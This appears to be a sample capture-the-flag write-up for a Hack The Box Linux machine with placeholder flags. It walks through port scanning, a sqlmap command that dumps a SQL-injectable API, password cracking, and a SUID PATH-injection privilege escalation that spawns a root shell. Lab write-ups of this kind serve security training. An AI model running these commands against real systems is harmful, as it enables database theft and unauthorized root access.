---
title: "SampleBox"
platform: "HTB"
difficulty: "Easy"
os: "Linux"
date: 2026-02-07
status: "rooted"
user_flag: true
root_flag: true
tags: [web, sqli, privesc-suid]
tools: [nmap, gobuster, sqlmap, linpeas]
ttl: "2h 15m"
---

## Reconnaissance

### Port Scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache 2.4.52
```

Nmap reveals SSH and HTTP. Let's enumerate the web server.

### Service Enumeration

Gobuster discovers `/admin` and `/api` endpoints. The `/api/users` endpoint accepts a `id` parameter.

## Initial Foothold

### Vulnerability Identified

The `id` parameter on `/api/users?id=1` is vulnerable to SQL injection. Error-based injection confirms MySQL backend.

### Exploitation

```bash
sqlmap -u "http://10.10.10.1/api/users?id=1" --dump
```

Extracted credentials: `admin:$2b$12$...` — cracked with hashcat to `Welcome123!`.

SSH as `admin` grants user shell.

### User Flag
```
user.txt: 31337{sample_user_flag}
```

## Privilege Escalation

### Enumeration

LinPEAS identifies a SUID binary at `/opt/backup` owned by root.

### Exploitation

The binary calls `tar` without an absolute path. PATH injection:

```bash
echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
PATH=/tmp:$PATH /opt/backup
```

Root shell obtained.

### Root Flag
```
root.txt: 31337{sample_root_flag}
```

## Lessons Learned

### What Worked
- Systematic enumeration — gobuster found the hidden API
- Recognizing error-based SQLi from verbose error messages

### What Failed
- Initially tried NoSQLi before confirming MySQL backend

### Key Takeaways
- Always check SUID binaries with `find / -perm -4000`
- PATH injection is trivial when SUID binaries use relative paths
